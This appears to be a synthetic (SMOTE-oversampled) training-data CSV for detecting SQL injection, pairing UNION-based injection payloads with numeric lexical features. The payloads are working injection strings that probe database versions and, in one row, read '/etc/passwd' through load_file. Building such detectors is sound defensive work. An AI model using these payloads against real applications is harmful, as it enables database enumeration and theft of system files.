id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_001721,attack,union,"-1641'||  (  select 'jfnu' where 7682  =  7682 union all select 7682,7682,7682--",nearest_attack_euclidean,R000027,1.1606143116599434,81.61798307004078,27.595504232489805,4.235755164022084,29.0,25.617983070040776,15.0,12.0,0.35551763258464547,0.31348319225033977,0.1838884306472304,0.14711074451778433,3.0,0.0,3.0,0.0,0.0,1.0,3.469446951953614e-18,1.0,0.0,3.469446951953614e-18,2.4044957675101943,5.595504232489805,1.0,0.0,1.0,0.0,0.0,1.0,1.0,3.469446951953614e-18,0.0,0.0,0.5955042324898058,2.0,1.0,1.0,5.551115123125783e-17,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_001722,attack,union,"-1550' in boolean mode  )   union all select 9777,9777,9777--",nearest_attack_euclidean,R000058,0.6334311404237465,64.67242822953752,23.734485645907505,4.097542509113467,27.0,18.93794258363001,11.0,7.734485645907503,0.41972857026148397,0.2901075146453084,0.17100052862504903,0.11916338646815863,1.0,0.0,3.0,0.0,0.0,0.0,3.469446951953614e-18,1.0,0.0,3.469446951953614e-18,2.734485645907503,3.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,3.469446951953614e-18,0.0,0.0,0.0,1.0,1.0,0.0,5.551115123125783e-17,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001723,attack,union," select * from users where id  =  1 or 1#""? union select version  (    )  ,version  (    )   -- 1",nearest_attack_euclidean,R000012,0.4810935101778502,97.99378723628595,27.066252482419063,3.784787558518651,50.12629220112408,3.0662524824190633,32.93374751758094,11.867495035161873,0.5107285317499102,0.03124494928992927,0.3365959619300363,0.12143055703012429,0.0,0.9337475175809364,2.0,0.0,1.0,1.0662524824190636,3.469446951953614e-18,3.867495035161873,0.0,3.469446951953614e-18,1.0,4.132504964838127,0.0,0.9337475175809364,1.0,0.9337475175809364,0.0,1.0,1.0,3.469446951953614e-18,0.0,0.0,0.0,2.0,1.0,1.0662524824190636,1.0662524824190636,3.469446951953614e-18,0.9337475175809364,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.066252482419063
SMOTE_001724,attack,union,"-3924'||  (  select 'ssld' from dual where 6229  =  6229 union all select 6229,6229,6229,6229,6229#",nearest_attack_euclidean,R000073,2.4722429190839406,104.13717280710355,28.532984290263315,4.166188926337702,37.0,35.73612567789349,17.0,14.40104712921006,0.3562832512522653,0.34210164483784594,0.16369771003482458,0.13791739387506424,3.0,0.0,1.9340314194733725,0.0,0.0,1.0,3.469446951953614e-18,1.0,0.0,3.469446951953614e-18,4.9340314194733725,4.9340314194733725,1.0,0.0,0.4670157097366863,0.5329842902633137,0.0,1.0,1.0,3.469446951953614e-18,0.0,0.0,1.0,2.0,1.0,1.0,1.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_001725,attack,union,"-5776%' union all select 3075,3075,3075,3075,3075--",nearest_attack_euclidean,R000031,0.4405630986176469,53.02770538334254,20.0,3.86518465456313,14.0,25.622164306674033,4.0,9.405541076668507,0.2645700716502817,0.482515914019662,0.07559144904293762,0.1773225652871187,1.0,0.0,3.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,3.469446951953614e-18,4.4055410766685075,3.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,1.0,1.0,0.0,5.551115123125783e-17,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001726,attack,union,"-7564'  )   as nank where 8095  =  8095 union all select 8095,8095,8095--",nearest_attack_euclidean,R000043,0.30114019641542106,73.0965477563868,27.193095512773592,4.1709392422338665,25.386191025547184,23.613808974452816,15.903452243613204,8.193095512773592,0.3472377362005321,0.323119383373153,0.21758742126648928,0.11205545915982558,1.1930955127735914,0.0,3.0,0.0,0.0,1.0,3.469446951953614e-18,1.0,0.0,3.469446951953614e-18,1.9034522436132042,4.096547756386796,1.0,0.0,1.0,0.0,0.0,1.0,1.0,3.469446951953614e-18,0.0,0.0,0.0,1.0965477563867958,1.0,1.0,5.551115123125783e-17,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0965477563867956
SMOTE_001727,attack,union,"-4452%"" union all select 7141,7141,7141,7141,7141,7141,7141,7141--",nearest_attack_euclidean,R000063,1.2628295232693092,69.5819644247183,19.0,3.456164943640597,14.0,39.18647331853872,4.0,12.395491106179572,0.2039150215030579,0.5606503371757319,0.05826143471515939,0.17717320660605074,0.0,1.0,3.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.598872776544893,3.469446951953614e-18,7.796618329634679,3.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,1.0,1.0,0.0,5.551115123125783e-17,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001728,attack,union,"-2384'||  (  select 'vhcp' from dual where 1266  =  1266 union all select 1266,1266,1266,1266--",nearest_attack_euclidean,R000047,0.31410240822027174,94.2827025190062,30.569621511403717,4.327204777255421,35.85232403040992,28.57383798479504,16.71308100760248,13.143459496198762,0.3798258233550541,0.3034618640962989,0.1771855851344012,0.13952672741424582,3.0,0.0,3.0,0.0,0.0,1.0,3.469446951953614e-18,1.0,0.0,3.469446951953614e-18,3.1434594961987607,6.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,3.469446951953614e-18,0.0,0.0,1.0,2.0,1.0,1.0,0.8565405038012395,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.85654050380124
SMOTE_001729,attack,union,"-5776%' union all select 3075,3075,3075,3075,3075--",nearest_attack_euclidean,R000031,0.8313404970646929,54.73913535801703,20.267081097001217,3.9310149930687817,14.0,27.204973164014596,4.0,9.534162194002432,0.2587185837067154,0.4928248515150334,0.07391959534477584,0.17453696943347535,1.0,0.0,3.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.7329189029987836,3.469446951953614e-18,4.801243291003649,3.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,1.0,1.0,0.0,5.551115123125783e-17,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001730,attack,union,"-4711' in boolean mode  )   union all select 8007,8007,8007,8007,8007,8007--",nearest_attack_euclidean,R000034,0.04904063177874016,75.80214817546918,23.07914072981233,4.011706056547571,27.0,27.841718540375343,11.0,9.960429635093835,0.356253150345132,0.36721839513628407,0.14514017236283155,0.13138828215575235,1.0,0.0,3.0,0.0,0.0,0.0,3.469446951953614e-18,1.0,0.0,3.469446951953614e-18,4.960429635093836,3.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,3.469446951953614e-18,0.0,0.0,0.0,1.0,1.0,0.0,5.551115123125783e-17,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001731,attack,union,"-7078'||  (  select 'lcza' where 5076  =  5076 union all select 5076,5076,5076,5076,5076,5076,5076,5076,5076,5076--",nearest_attack_euclidean,R000038,0.23639944802282048,116.01365817462874,26.405463269851502,4.033996628984308,29.810926539703,52.0,15.202731634925751,19.0,0.2566163801740251,0.4485071147769951,0.13099890541892384,0.1638775996300559,3.0,0.0,3.0,0.0,0.0,1.0,3.469446951953614e-18,1.0,0.0,3.469446951953614e-18,9.0,6.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,3.469446951953614e-18,0.0,0.0,1.0,2.0,1.0,1.0,0.10136581746287537,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.1013658174628755
SMOTE_001732,attack,union,"-4955%' union all select 5928,5928--",nearest_attack_euclidean,R000051,1.7090426597353636,38.13537606028499,19.145849575886004,3.9460087936663357,14.0,13.708300848227992,4.0,6.427075212056998,0.368634644414641,0.3576384267024308,0.10532418411846885,0.16840274476445935,0.5729247879430018,0.42707521205699817,3.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,3.469446951953614e-18,1.4270752120569985,3.0,0.5729247879430018,0.42707521205699817,1.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,1.0,1.0,0.0,5.551115123125783e-17,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001733,attack,union," select * from users where id  =  1 +  (  1  )   union select null,banner from v$version where rownum  =  1 -- 1",nearest_attack_euclidean,R000003,1.3852496918634456,107.76660474855673,27.23029177246486,3.9961319128954456,64.46058354492972,4.38485411376757,29.30602120362701,9.61514588623243,0.5987437626969045,0.04102167978675214,0.2710168867443785,0.08921767077196471,0.0,0.0,2.0,0.0,1.0,2.0,3.469446951953614e-18,1.2302917724648594,0.0,3.469446951953614e-18,1.0,6.38485411376757,0.0,0.0,1.0,0.0,0.0,1.0,0.6151458862324297,3.469446951953614e-18,0.0,0.0,0.0,2.0,1.0,1.9999999999999998,2.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_001734,attack,union," select * from users where id  =  '1' or \.<\ union select 1,@@VERSION -- 1'",nearest_attack_euclidean,R000001,0.033469644718476396,76.0,33.120420140565734,4.4431620531670335,42.0,3.0,17.0,14.0,0.5526315789473685,0.03947368421052633,0.2236842105263158,0.18421052631578946,3.0,0.0,2.0,0.0,1.0,1.0,3.469446951953614e-18,0.0,0.0,3.469446951953614e-18,1.0,5.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,2.0,1.0,1.0,1.0,3.469446951953614e-18,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_001735,attack,union," select * from users where id  =  1 + $+%1 union select null,@@VERSION -- 1",nearest_attack_euclidean,R000011,0.5001284970183608,75.0,32.0,4.388249091412543,44.0,2.8474172208011943,17.0,11.152582779198804,0.5866666666666667,0.03796556294401593,0.22666666666666666,0.14870110372265072,0.0,0.0,2.0,0.0,1.1525827791988044,1.0,3.469446951953614e-18,0.0,0.8474172208011956,3.469446951953614e-18,1.0,6.152582779198804,0.0,0.0,1.0,0.0,0.0,1.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,2.0,1.0,1.0,1.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_001736,attack,union," select * from users where id  =  1 or 1#""; union select 'a',version  (    )   -- 1",nearest_attack_euclidean,R000020,2.093927548903675,81.65885231798462,29.766370104008782,4.079896243704148,42.8084074739978,3.0,23.467259791982436,12.383185052004391,0.5246935907844766,0.036782410121440456,0.2863524500293162,0.1521715490647668,2.1915925260021956,0.8084074739978044,2.0,0.0,1.0,1.0,0.8084074739978043,1.6168149479956089,0.0,3.469446951953614e-18,1.0,4.191592526002196,1.0,0.8084074739978044,1.0,0.8084074739978044,0.0,1.0,0.8084074739978044,0.8084074739978043,0.0,0.0,0.0,2.0,1.0,1.0,1.0,3.469446951953614e-18,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_001737,attack,union," select * from users where id  =  1 + $+%1 union select null,@@VERSION -- 1",nearest_attack_euclidean,R000011,1.7722059520171602,75.30423772096476,32.60847544192953,4.410929295506555,43.39152455807047,3.0,17.0,11.912713162894288,0.5763119091461116,0.039839874883702775,0.22575929100764894,0.1580889249625367,0.9127131628942882,0.0,2.0,0.0,1.0,1.0,3.469446951953614e-18,0.0,0.6957622790352374,3.469446951953614e-18,1.0,5.695762279035237,0.3042377209647628,0.0,1.0,0.0,0.0,1.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,2.0,1.0,1.0,1.0,3.469446951953614e-18,0.30423772096476276,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.304237720964762
SMOTE_001738,attack,union,"-6186' in boolean mode  )   union all select 2990,2990,2990#",nearest_attack_euclidean,R000066,1.1135022133167936,60.21539698687376,24.569206026252473,4.154231538366703,27.0,16.0,11.0,6.215396986873762,0.44841100583453786,0.26572504049454093,0.18268596533999687,0.10317798833092437,1.0,0.0,1.4307939737475246,0.0,0.0,0.0,3.469446951953614e-18,1.0,0.0,3.469446951953614e-18,2.0,1.4307939737475248,1.0,0.0,0.2153969868737624,0.7846030131262377,0.0,0.0,1.0,3.469446951953614e-18,0.0,0.0,0.0,1.0,1.0,0.0,5.551115123125783e-17,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001739,attack,union," select * from users where id  =  1 +1 union select null,banner from v$version where rownum  =  1 -- 1",nearest_attack_euclidean,R000010,0.3045856614842517,101.65603984481514,26.0,4.044586264770409,64.62415937926055,4.343960155184863,24.343960155184867,8.343960155184865,0.6356402278127331,0.04275478319254472,0.23950096870057203,0.08210402029415018,0.0,0.0,2.0,0.0,1.0,2.0,3.469446951953614e-18,0.0,0.0,3.469446951953614e-18,1.0,6.343960155184865,0.0,0.0,1.0,0.0,0.0,1.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,2.0,1.0,1.9999999999999998,2.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_001740,attack,union," select * from users where id  =  1 | |1 union select 1,banner from v$version where rownum  =  1 -- 1",nearest_attack_euclidean,R000016,0.8264926474246542,101.38277731292183,26.19138865646092,4.047019086108066,62.0,5.0,24.808611343539084,9.574165969382754,0.611580102528006,0.049320976010323064,0.24474673775587824,0.09435218370579271,0.574165969382753,0.0,2.0,0.0,1.0,2.0,3.469446951953614e-18,0.0,0.0,3.469446951953614e-18,1.0,7.0,0.19138865646091774,0.0,1.0,0.0,0.0,1.0,0.0,3.469446951953614e-18,0.0,0.0,0.19138865646091782,2.0,1.0,1.9999999999999998,2.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_001741,attack,union," select * from users where id  =  1 *1 union select null,banner from v$version where rownum  =  1 -- 1",nearest_attack_euclidean,R000004,0.9373068354650861,104.23855875766648,25.671567627299943,4.020033031574156,66.0,4.0,25.790847006133184,8.447711751533296,0.6341259735639017,0.038431877185690966,0.24658096852604947,0.08086118072435788,0.0,0.0,2.0,0.0,1.7761441242333518,2.0,3.469446951953614e-18,0.4477117515332962,0.0,3.469446951953614e-18,1.0,6.0,0.0,0.0,1.0,0.0,0.0,1.0,0.22385587576664817,3.469446951953614e-18,0.0,0.0,0.0,2.0,1.0,1.9999999999999998,2.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_001742,attack,union,"-2643%"" union all select 7779,7779--",nearest_attack_euclidean,R000048,0.2085602729090193,36.0,20.941374396704454,4.087277938291776,14.0,12.0,4.0,6.0,0.3888888888888889,0.3333333333333333,0.1111111111111111,0.16666666666666666,0.05862560329554789,0.9413743967044523,3.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,3.469446951953614e-18,1.0,3.0,0.05862560329554778,0.9413743967044522,1.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,1.0,1.0,0.0,5.551115123125783e-17,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001743,attack,union," select * from users where id  =  '1' + $+*$ union select 1,@@VERSION -- 1'",nearest_attack_euclidean,R000018,0.4520274844464568,75.0,32.0,4.420128486078378,40.36117637321737,3.0,17.0,14.638823626782633,0.538149018309565,0.03999999999999998,0.22666666666666666,0.19518431502376843,2.7291177200869745,0.0,2.0,0.0,1.909705906695658,1.0,3.469446951953614e-18,0.0,0.09029409330434189,3.469446951953614e-18,1.0,6.909705906695658,0.9097059066956581,0.0,1.0,0.0,0.0,1.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,2.0,1.0,1.0,1.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_001744,attack,union,"-3370' in boolean mode  )   union all select 3432,3432,3432,3432#",nearest_attack_euclidean,R000060,0.776599035883949,66.57215738301674,25.43814382553445,4.208185643805705,27.0,21.257725906413395,11.0,7.314431476603348,0.41056705570189955,0.31340200805700796,0.1672680597304035,0.10876287651068899,1.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,1.0,0.0,3.469446951953614e-18,3.3144314766033487,1.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,3.469446951953614e-18,0.0,0.0,0.0,1.0,1.0,0.0,5.551115123125783e-17,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001745,attack,union,"-7848%"" union all select 1580,1580,1580,1580,1580,1580,1580--",nearest_attack_euclidean,R000049,1.1342736424227842,57.56202026601409,20.218989866992956,3.8573452804442208,14.0,29.562020266014088,4.0,10.0,0.24349158222494133,0.5130168355501175,0.06956902349284037,0.17392255873210094,0.0,1.0,3.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.6094949334964787,3.469446951953614e-18,5.390505066503521,3.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,1.0,1.0,0.0,5.551115123125783e-17,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001746,attack,union," select * from users where id  =  1 +1 union select null,banner from v$version where rownum  =  1 -- 1",nearest_attack_euclidean,R000010,0.44199908146539385,102.0,25.77101297049163,4.048050344019515,66.0,4.0,24.0,8.0,0.6470588235294118,0.039215686274509776,0.23529411764705882,0.0784313725490196,0.0,0.0,2.0,0.0,1.2289870295083727,2.0,3.469446951953614e-18,0.0,0.0,3.469446951953614e-18,1.0,6.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,2.0,1.0,1.9999999999999998,2.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_001747,attack,union,-4058  )   union all select 9184--,nearest_attack_euclidean,R000039,0.2835082362588964,34.886991373197795,19.12671305331397,3.8631613821810693,14.0,8.25342610662794,8.38013915994191,4.253426106627941,0.40415571125933264,0.23622583127436741,0.23886568655174178,0.12075277091455809,0.0633565266569851,0.0,3.0,0.0,0.0,0.0,3.469446951953614e-18,1.063356526656985,0.06335652665698485,3.469446951953614e-18,0.06335652665698488,3.0,0.06335652665698499,0.0,1.0,0.0,0.0,0.0,1.0,3.469446951953614e-18,0.0,0.0,0.0,1.0,1.0,0.0,5.551115123125783e-17,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001748,attack,union," union select 1,load_file  (  '/etc/passwd'  )  ,1,1,1;",nearest_attack_euclidean,R000006,4.588369392434638,60.18564731822772,23.777847097734156,4.173636627149859,27.740717634088615,10.222776781873263,11.0,11.222152902265842,0.4704342654459388,0.1506691233285136,0.18617160715139275,0.19272500407415483,1.7407176340886141,0.0,0.25928236591138587,1.481435268177228,0.0,0.0,0.740717634088614,1.7407176340886141,0.0,0.740717634088614,4.259282365911386,1.7407176340886141,1.0,0.0,0.0,0.259282365911386,0.0,0.0,1.0,0.740717634088614,0.0,0.0,0.0,1.0,1.0,0.0,5.551115123125783e-17,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.740717634088614,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.7407176340886137
SMOTE_001749,attack,union,"-2314%'   )    )    union all select 4612,4612--",nearest_attack_euclidean,R000023,1.1236473313280166,51.47626584340172,21.534810129754113,3.8700244968838766,17.47626584340172,13.069620259508223,13.197784805368833,7.732594935122945,0.33203314162420033,0.25328776719111135,0.2618941082138251,0.15278498297086324,1.0,0.0,3.0,0.0,0.0,0.0,3.469446951953614e-18,1.7325949351229444,0.7325949351229444,3.469446951953614e-18,1.2674050648770558,3.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,3.469446951953614e-18,0.0,0.0,0.0,1.0,1.0,0.0,5.551115123125783e-17,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001750,attack,union,"-8677'||  (  select 'ihpm' from dual where 9571  =  9571 union all select 9571,9571,9571,9571,9571,9571,9571,9571,9571,9571--",nearest_attack_euclidean,R000062,1.0352849751487594,120.5607972569014,28.22431890276056,4.137085971950018,33.44863780552112,52.0,16.11215945138028,19.0,0.2765447114563331,0.4320583334011219,0.13352948716905816,0.15786746797348683,3.0,0.0,3.0,0.0,0.0,1.0,3.469446951953614e-18,1.0,0.0,3.469446951953614e-18,9.0,6.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,3.469446951953614e-18,0.0,0.0,1.0,2.0,1.0,1.0,0.5560797256901401,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.55607972569014
